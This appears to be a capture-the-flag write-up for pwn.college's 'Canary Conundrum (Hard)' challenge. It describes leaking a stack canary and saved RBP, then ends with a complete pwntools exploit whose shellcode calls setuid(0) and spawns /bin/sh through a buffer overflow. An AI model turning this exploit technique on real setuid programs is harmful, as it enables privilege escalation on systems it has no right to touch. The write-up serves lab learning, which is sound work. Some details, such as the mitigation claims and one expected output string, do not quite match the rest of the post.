---
layout: post
title: "pwn.college: Canary Conundrum (Hard) – Write-up"
date: 2026-11-15
tags: [Pwn] 
description: This post discuss the solution Canary Conundrum (Hard) from pwn.college
---

# Introduction
This blog post is a write-up of the **Canary Conundrum (Hard)** challenge from [pwn.college](https://pwn.college/). 

# Gaining insights on the binary

The first step I usually do, is to check the mitigations of the binary using the `checksec` command in pwndbg. The command's output shows that all the mitigations are turned on.

It's good to see that stack canary mitigation is enabled. However, since the stack is executable, my initial intuition was that we might first need to leak the canary and then exploit the buffer overflow by overwriting the return address to point to our shellcode.

![img]({{'/assets/images/Canary_Conundrum/img1.png' | relative_url }}){: .center-image }*(**The mitigations status**)*

After executing the binary, I observed that it prompts the user for input and then prints the provided input to the screen.

> CommandLine 
{:.filename}
{% highlight CMD %}
$ /challenge/canary-conundrum-hard 
###
### Welcome to /challenge/canary-conundrum-hard!
###

Payload size: 12
Send your payload (up to 12 bytes)!
hshahdhhdh
You said: hshahdhhdh

Goodbye!
### Goodbye!
{% endhighlight %}

# Finding the vulnerability

As demonstrated earlier, the binary prints our input, which is stored on the stack at `RBP-0x98`, while the stack canary is located at `RBP-0x10`.

![img]({{'/assets/images/PwnableXYZ-Welcome/image3.png' | relative_url }}){: .center-image }*(**Canary vs input stack locations**)*

Therefore, by filling the buffer with 137 bytes of garbage, we should be able to reach and leak the canary value, as appears below.

![img]({{'/assets/images/PwnableXYZ-Welcome/img4.png' | relative_url }}){: .center-image }*(**Canary leak**)*

Additionally, the binary checks our input for the string **"REPEAT"**. If the string is found, it recursively calls itself, reusing the same canary value that we previously leaked.

![img]({{'/assets/images/PwnableXYZ-Welcome/img5.png' | relative_url }}){: .center-image }*(**Recursive call**)*


# Exploiting the vulnerability

Therefore, the exploitation plan consists of the following steps:
  1. Leak the stack canary to bypass the stack canary protection.
  2. Leak the saved RBP to calculate the address of the shellcode that we will inject.
  3. Trigger a recursive call to `vulnerableFun` and exploit the buffer overflow. This time, we preserve the previously leaked canary value and overwrite the saved return address with the shellcode address, calculated as `0x11b0 bytes` away from the leaked saved RBP.

> exploit.py
{:.filename}
{% highlight Python %}

from pwn import *

context.terminal=['xfce4-terminal','-e'] # Configure the terminal used by pwntools (check the parent process with "pstree -s $$")
context.arch = "amd64"

# Function responsible for leaking information from the stack
def leak(process,payload, offset,size):
 process.sendline(str(len(payload)).encode())
 process.sendline(payload)
 st = process.recvuntil(b"Backdoor triggered!")
 line = st.split(b"You said: ")[1]
 leakage = line[offset:offset+size]
 return leakage

shellcode = asm( # Assemble the shellcode
'''
push 0x69
push 0x0
pop rdi
pop rax
syscall; // Invoke setuid syscall
push qword ptr[rip+binsh]
push rsp
pop rdi
push 0
push 0
push 0
pop rsi
pop rdx
pop rax
or al,0x3b
syscall

binsh:
.string "/bin/sh"
''')

targetProcess = process("/challenge/canary-conundrum-hard")

# Prepare the initial payload to trigger the recursive call and leak stack values
payload1 = b'REPEAT'+b'a'*131
leakage =  leak(targetProcess,payload1,len(payload1),7+6)

# Extract the leaked canary and restore its original null byte.
# The canary's first byte is always null, so it must be reconstructed manually.
canary = b'\x00' + leakage[0:7]

# Extract the leaked saved RBP value
stackAdd = leakage[7:]

print("Canary: ", canary)

print("Leaked RBP: ", hex(u64(stackAdd+b'\x00'*2)))

# Calculate the shellcode address using the offset identified during GDB debugging
offset = 0x7ffd47b46a00 - 0x7ffd47b45850  

# Derive the estimated shellcode address from the leaked saved RBP
ShellcodeAdd = p64(u64(stackAdd+b'\x00'*2)-offset)

print("Shellcode Address:", hex(u64(ShellcodeAdd)))

# Trigger the buffer overflow using the previously leaked canary value.
# Preserve the canary, overwrite the saved RBP, and redirect execution
# to the calculated shellcode address.
targetProcess.sendline(b'160')
targetProcess.sendline(shellcode + b'\x90'*(136-len(shellcode)) + canary + b'b'*8 + ShellcodeAdd)

# Interact with the target process
targetProcess.interactive()

{% endhighlight %}

The flag is then successfully captured, as shown below.

![img]({{'/assets/images/PwnableXYZ-Welcome/img6.png' | relative_url }}){: .center-image }*(**The flag**)*












